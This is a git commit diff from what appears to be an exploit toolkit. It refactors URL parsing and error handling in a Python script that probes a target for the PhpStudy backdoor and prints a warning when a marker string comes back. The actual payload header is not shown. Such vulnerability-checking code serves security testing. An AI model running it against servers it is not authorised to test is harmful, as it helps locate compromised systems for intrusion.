8c6c857cf9b8b603a2314ed69cbdef9fd7d6b192
JE2Se <834590049@qq.com>
2020-06-12 09:29:24 +0800

    更新模板❤️❤️❤️

--- exphub/phpstudy/PhpStudy_BackDoor.py
+++ exphub/phpstudy/PhpStudy_BackDoor.py
@@ -12,17 +12,11 @@
 
 from lib import *
 import logging
-from lib.Urldeal import urldeal
+from lib.Urldeal import umethod
 import requests
 
 def PhpStudy_BackDoor(Url):
-    scheme, url, port = urldeal(Url)
-    if port is None and scheme == 'https':
-        port = 443
-    elif port is None and scheme == 'http':
-        port = 80
-    else:
-        port = port
+    scheme, url, port = umethod(Url)
     urldata = scheme + "://" + url + ':' + str(port) + '/'
     header = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -37,5 +31,5 @@ def PhpStudy_BackDoor(Url):
         a = requests.get(urldata, headers=header, timeout=5, verify=False)
         if "JE2SeJustTrustme" in a.text:
             print(Vcolors.RED + "[!] 存在PhpStudy后门漏洞\r" + Vcolors.ENDC)
-    except:
+    except Exception as e :
         logging.error("PhpStudy_BackDoor脚本出现异常")
